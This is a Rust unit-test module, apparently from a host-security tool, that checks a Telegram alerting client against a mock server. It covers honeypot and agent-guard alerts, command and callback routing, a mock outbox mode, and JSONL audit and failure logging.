            agent_name: "OperatorBot".to_string(),
            command: "x".repeat(160),
            risk_score: 63,
            severity: "medium".to_string(),
            recommendation: "review".to_string(),
            signals: vec![],
            atr_rule_ids: vec![],
            explanation: "needs operator review".to_string(),
            tenant: None,
        };
        client.send_agent_guard_alert(&medium_review_alert).await?;
        let low_monitor_alert = crate::dashboard::AgentGuardAlert {
            ts: chrono::Utc::now(),
            agent_name: "OperatorBot".to_string(),
            command: "cat /tmp/suspicious.log".to_string(),
            risk_score: 24,
            severity: "low".to_string(),
            recommendation: "monitor".to_string(),
            signals: vec!["odd_file_access".to_string()],
            atr_rule_ids: vec![],
            explanation: "watching low-risk behavior".to_string(),
            tenant: None,
        };
        client.send_agent_guard_alert(&low_monitor_alert).await?;

        client
            .send_honeypot_suggestion(
                &incident,
                "198.51.100.11",
                "credential stuffing",
                0.83,
                "honeypot",
            )
            .await?;
        client
            .send_honeypot_suggestion(
                &incident,
                "198.51.100.12",
                "scanning behavior",
                0.79,
                "monitor",
            )
            .await?;
        client
            .resolve_confirmation(900, false, false, "Charlie")
            .await?;

        let mut many_credentials = Vec::new();
        for idx in 0..11usize {
            many_credentials.push((
                format!("user{idx}"),
                Some("avery-very-very-long-password-value".to_string()),
            ));
        }
        let honeypot_commands = vec!["uname -a".to_string()];
        client
            .send_honeypot_session_report(
                "198.51.100.20",
                "sess-extended",
                120,
                &honeypot_commands,
                &many_credentials,
                &crate::ioc::ExtractedIocs::default(),
                "credential harvesting",
                false,
            )
            .await?;

        let mut client_no_dashboard = build_test_client(port, cert_dir.path())?;
        client_no_dashboard.dashboard_url = None;
        client_no_dashboard
            .send_honeypot_session_report(
                "198.51.100.30",
                "sess-no-buttons",
                8,
                &Vec::new(),
                &Vec::new(),
                &crate::ioc::ExtractedIocs::default(),
                "probe-only",
                true,
            )
            .await?;

        client
            .send_abuseipdb_autoblock(
                "203.0.113.99",
                55,
                50,
                0,
                None,
                None,
                "Reputation gate in dry-run",
                true,
                None,
            )
            .await?;

        let current_hour: u32 = chrono::Utc::now()
            .format("%H")
            .to_string()
            .parse()
            .unwrap_or(0);
        client
            .alert_counter_hour
            .store((current_hour + 1) % 24, Ordering::Relaxed);
        client.alerts_this_hour.store(9, Ordering::Relaxed);
        client.send_alert_html("<b>reset-check</b>").await?;
        assert_eq!(
            client.alert_counter_hour.load(Ordering::Relaxed),
            current_hour
        );
        assert_eq!(client.alerts_this_hour.load(Ordering::Relaxed), 1);

        let empty_dir = tempfile::tempdir()?;
        assert!(
            read_undoable_allowlist_entries(empty_dir.path(), 5).is_empty(),
            "missing history file should produce no undoable entries"
        );

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn run_polling_routes_honeypot_variants_and_text_aliases() -> anyhow::Result<()> {
        let mut result = vec![
            json!({
                "update_id": 301,
                "callback_query": {
                    "id": "cb-301",
                    "from": { "first_name": "Dana" },
                    "data": "hpot:honeypot:3.3.3.3",
                    "message": { "message_id": 3001, "chat": { "id": 99 } }
                }
            }),
            json!({
                "update_id": 302,
                "callback_query": {
                    "id": "cb-302",
                    "from": { "first_name": "Dana" },
                    "data": "hpot:block:4.4.4.4",
                    "message": { "message_id": 3002, "chat": { "id": 99 } }
                }
            }),
            json!({
                "update_id": 303,
                "callback_query": {
                    "id": "cb-303",
                    "from": { "first_name": "Dana" },
                    "data": "hpot:ignore:5.5.5.5",
                    "message": { "message_id": 3003, "chat": { "id": 99 } }
                }
            }),
        ];
        let text_commands = [
            "/status@InnerWardenBot",
            "/help details",
            "/menu now",
            "/incidents now",
            "/threats now",
            "/decisions now",
            "/blocked now",
            "/guard now",
            "/watch now",
            "/doctor now",
            "/capabilities now",
            "/list now",
            "/disable ai",
            "/undo now",
            "/ask why did this trigger?",
            "what changed today?",
            "/foobar",
        ];
        for (idx, text_command) in (1usize..).zip(text_commands.iter()) {
            result.push(json!({
                "update_id": 303 + idx as i64,
                "message": {
                    "message_id": 3100 + idx as i64,
                    "text": text_command,
                    "from": { "first_name": "Dana" },
                    "chat": { "id": 99 }
                }
            }));
        }

        let updates = vec![json!({ "ok": true, "result": result })];
        let (_state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = Arc::new(build_test_client(port, cert_dir.path())?);
        let (tx, mut rx) = mpsc::channel::<ApprovalResult>(64);
        let mut task = tokio::spawn(client.run_polling(tx));

        let mut incident_ids = Vec::new();
        for _ in 0..20usize {
            let routed = tokio::time::timeout(Duration::from_secs(2), rx.recv())
                .await
                .context("timed out waiting for routed polling result")?
                .context("approval channel closed before collecting all results")?;
            incident_ids.push(routed.incident_id);
        }

        for expected in [
            "__hpot__:3.3.3.3",
            "__hpot__:4.4.4.4",
            "__hpot__:5.5.5.5",
            "__status__",
            "__help__",
            "__menu__",
            "__threats__",
            "__decisions__",
            "__blocked__",
            "__guard__",
            "__watch__",
            "__doctor__",
            "__capabilities__",
            "__disable__:ai",
            "__undo__",
            "__ask__:why did this trigger?",
            "__ask__:what changed today?",
            "__unknown_cmd__",
        ] {
            assert!(
                incident_ids.iter().any(|id| id == expected),
                "missing routed text/callback variant: {expected}"
            );
        }

        drop(rx);
        if tokio::time::timeout(Duration::from_secs(2), &mut task)
            .await
            .is_err()
        {
            task.abort();
        }

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn run_polling_send_failure_paths_return_early() -> anyhow::Result<()> {
        for target_callback_data in [
            "quick:block:1.2.3.4",
            "hpot:block:2.2.2.2",
            "allow:proc:sshd",
            "allow:ip:10.0.0.1",
            "fp:incident-123",
            "autofp:no:proc:sshd",
            "undo:proc:sshd",
            "enable2fa",
            "reject:incident-xyz",
        ] {
            assert_polling_send_failure_line(target_callback_data).await?;
        }
        Ok(())
    }

    #[tokio::test]
    async fn run_polling_covers_get_updates_error_branch() -> anyhow::Result<()> {
        // Port 65001 has nothing listening; this test only exercises the
        // error branch of get_updates. We still need a cert dir so
        // build_test_client can construct a reqwest client — generate an
        // ephemeral self-signed cert solely for that purpose.
        let cert_dir = tempfile::tempdir()?;
        let params = rcgen::CertificateParams::new(vec!["api.telegram.org".to_string()])?;
        let key_pair = rcgen::KeyPair::generate()?;
        let cert = params.self_signed(&key_pair)?;
        std::fs::write(cert_dir.path().join("mock-cert.pem"), cert.pem())?;

        let client = Arc::new(build_test_client(65001, cert_dir.path())?);
        let (tx, rx) = mpsc::channel::<ApprovalResult>(1);
        let task = tokio::spawn(client.run_polling(tx));

        tokio::time::sleep(Duration::from_millis(250)).await;
        drop(rx);
        tokio::time::sleep(Duration::from_millis(150)).await;
        task.abort();
        let _ = task.await;
        Ok(())
    }

    #[tokio::test]
    async fn send_text_message_handles_not_ok_telegram_response() -> anyhow::Result<()> {
        let (_state, server, port, cert_dir) =
            start_mock_telegram_server_with_options(vec![], true).await?;
        let client = build_test_client(port, cert_dir.path())?;

        client.send_text_message("<b>still ok</b>").await?;

        server.abort();
        Ok(())
    }

    // ─── Spec 024: mock-telegram env gate ───────────────────────────────
    //
    // These tests are serialized via a mutex because they mutate process-wide
    // env vars (std::env::set_var is !Send-safe across parallel test cases).
    // Guard rails: every test restores the prior env value before returning.
    mod mock_env_tests {
        use super::super::*;
        use std::sync::Mutex;

        // Serialize the whole mock-env block. `once_cell` is not needed —
        // std::sync::Mutex::new is const since 1.63.
        static ENV_LOCK: Mutex<()> = Mutex::new(());

        fn with_env<F: FnOnce()>(enabled: Option<&str>, path: Option<&str>, body: F) {
            let guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
            let prev_enabled = std::env::var("INNERWARDEN_MOCK_TELEGRAM").ok();
            let prev_path = std::env::var("INNERWARDEN_MOCK_TELEGRAM_PATH").ok();
            match enabled {
                Some(v) => std::env::set_var("INNERWARDEN_MOCK_TELEGRAM", v),
                None => std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM"),
            }
            match path {
                Some(v) => std::env::set_var("INNERWARDEN_MOCK_TELEGRAM_PATH", v),
                None => std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM_PATH"),
            }
            body();
            match prev_enabled {
                Some(v) => std::env::set_var("INNERWARDEN_MOCK_TELEGRAM", v),
                None => std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM"),
            }
            match prev_path {
                Some(v) => std::env::set_var("INNERWARDEN_MOCK_TELEGRAM_PATH", v),
                None => std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM_PATH"),
            }
            drop(guard);
        }

        #[test]
        fn mock_outbox_from_env_honors_flag_and_path() {
            with_env(Some("1"), Some("/tmp/spec-024-outbox.jsonl"), || {
                let path = mock_outbox_from_env().expect("mock mode enabled");
                assert_eq!(path, std::path::PathBuf::from("/tmp/spec-024-outbox.jsonl"));
            });
        }

        #[test]
        fn mock_outbox_from_env_default_path_when_unset() {
            with_env(Some("1"), None, || {
                let path = mock_outbox_from_env().expect("mock mode enabled");
                assert_eq!(path, std::path::PathBuf::from("/tmp/telegram-outbox.jsonl"));
            });
        }

        #[test]
        fn mock_outbox_from_env_returns_none_when_disabled() {
            with_env(None, None, || {
                assert!(mock_outbox_from_env().is_none());
            });
            with_env(Some("0"), None, || {
                assert!(mock_outbox_from_env().is_none());
            });
        }

        #[tokio::test(flavor = "current_thread")]
        async fn send_alert_html_writes_jsonl_line_in_mock_mode() -> anyhow::Result<()> {
            use std::sync::atomic::{AtomicU64, Ordering};
            use std::sync::Arc;

            let tmp = tempfile::tempdir()?;
            let outbox = tmp.path().join("telegram-outbox.jsonl");
            let outbox_str = outbox.to_string_lossy().to_string();
            let sent_counter = Arc::new(AtomicU64::new(0));

            // Build client under env lock, then drop env before awaiting — the
            // client captures the outbox into its own field on construction.
            let mut client = {
                let _guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
                let prev_enabled = std::env::var("INNERWARDEN_MOCK_TELEGRAM").ok();
                let prev_path = std::env::var("INNERWARDEN_MOCK_TELEGRAM_PATH").ok();
                std::env::set_var("INNERWARDEN_MOCK_TELEGRAM", "1");
                std::env::set_var("INNERWARDEN_MOCK_TELEGRAM_PATH", &outbox_str);
                let c = TelegramClient::new("token-fake", "chat-fake", None)?;
                match prev_enabled {
                    Some(v) => std::env::set_var("INNERWARDEN_MOCK_TELEGRAM", v),
                    None => std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM"),
                }
                match prev_path {
                    Some(v) => std::env::set_var("INNERWARDEN_MOCK_TELEGRAM_PATH", v),
                    None => std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM_PATH"),
                }
                c
            };

            assert!(client.is_mock());
            client.set_telegram_sent_counter(sent_counter.clone());
            client.send_raw_html("<b>spec-024</b>").await?;
            client.send_text_message("payload").await?;
            assert_eq!(
                sent_counter.load(Ordering::Relaxed),
                0,
                "mock mode must not affect real-api telemetry counter"
            );

            let contents = std::fs::read_to_string(&outbox)?;
            let lines: Vec<&str> = contents.lines().filter(|l| !l.is_empty()).collect();
            assert_eq!(lines.len(), 2, "one JSONL line per send_* call");
            for line in &lines {
                let v: serde_json::Value = serde_json::from_str(line)?;
                assert_eq!(v["method"], "sendMessage");
                assert!(v["ts"].as_str().is_some());
                assert!(v["body"].is_object());
            }
            let first: serde_json::Value = serde_json::from_str(lines[0])?;
            assert!(first["text"]
                .as_str()
                .unwrap_or_default()
                .contains("spec-024"));
            Ok(())
        }
    }

    /// 2026-05-01: persistent audit jsonl regression. The operator's
    /// question "auditar o que funciona" had no usable answer
    /// because env_filter dropped the journald audit and there was
    /// no durable file. This test pins:
    ///   1. `set_audit_jsonl_path` records the path
    ///   2. every send appends a JSON record with required fields
    ///   3. fail-open: a write failure does not abort the send path
    #[tokio::test]
    async fn telegram_audit_jsonl_appends_one_line_per_send() -> Result<()> {
        let dir = tempfile::tempdir()?;
        let mock_path = dir.path().join("mock-outbox.jsonl");
        std::env::set_var("INNERWARDEN_MOCK_TELEGRAM", "1");
        std::env::set_var("INNERWARDEN_MOCK_TELEGRAM_PATH", &mock_path);
        let mut client = TelegramClient::new("dummy-token", "dummy-chat", None)?;
        let audit_path = dir.path().join("telegram-sent.jsonl");
        client.set_audit_jsonl_path(audit_path.clone());

        client.send_text_message("hello operator").await?;
        client.send_text_message("second send").await?;

        let content = std::fs::read_to_string(&audit_path)?;
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 2, "two sends → two audit lines");
        let first: serde_json::Value = serde_json::from_str(lines[0])?;
        for field in [
            "ts",
            "method",
            "chat_id",
            "text_preview",
            "text",
            "has_keyboard",
        ] {
            assert!(
                first.get(field).is_some(),
                "audit record missing required field {field}"
            );
        }
        assert_eq!(first["method"], "sendMessage");
        assert_eq!(first["text"], "hello operator");
        assert_eq!(first["has_keyboard"], false);
        std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM");
        std::env::remove_var("INNERWARDEN_MOCK_TELEGRAM_PATH");
        Ok(())
    }

    #[test]
    fn append_jsonl_line_creates_parent_directory_and_appends() {
        let dir = tempfile::tempdir().unwrap();
        // Path nested in a not-yet-existing subdir.
        let path = dir.path().join("nested/deep/audit.jsonl");
        let r1 = serde_json::json!({"a": 1});
        let r2 = serde_json::json!({"a": 2});
        append_jsonl_line(&path, &r1).unwrap();
        append_jsonl_line(&path, &r2).unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 2);
        let parsed1: serde_json::Value = serde_json::from_str(lines[0]).unwrap();
        let parsed2: serde_json::Value = serde_json::from_str(lines[1]).unwrap();
        assert_eq!(parsed1["a"], 1);
        assert_eq!(parsed2["a"], 2);
    }

    /// 2026-05-01: regression for the silent-failure gap. Pre-fix, a
    /// telegram send that hit an HTTP error logged WARN to journald
    /// and dropped the message — operator had no durable record of
    /// "what was meant to send but didn't". The integrity alerts +
    /// daily digests + manual approvals on a transient network blip
    /// were lost within journald's rotation window.
    ///
    /// Test setup: route the client through the local mock Telegram
    /// server and force an ok=false API response. Confirm
    /// `telegram-failed.jsonl` captures the original message + error.
    #[tokio::test]
    async fn telegram_failed_jsonl_records_api_failure() -> Result<()> {
        let dir = tempfile::tempdir()?;
        let (_state, server, port, cert_dir) =
            start_mock_telegram_server_with_options(vec![], true).await?;
        let mut client = build_test_client(port, cert_dir.path())?;
        let failed_path = dir.path().join("telegram-failed.jsonl");
        client.set_failed_jsonl_path(failed_path.clone());

        client.send_text_message("operator integrity alert").await?;

        // The failed-jsonl file must exist with one record.
        let content = std::fs::read_to_string(&failed_path)?;
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 1, "exactly one failure record per failed send");
        let parsed: serde_json::Value = serde_json::from_str(lines[0])?;
        assert_eq!(parsed["method"], "sendMessage");
        assert_eq!(parsed["text"], "operator integrity alert");
        assert!(parsed["error"]
            .as_str()
            .unwrap_or_default()
            .contains("api ok=false"));
        server.abort();
        Ok(())
    }
}
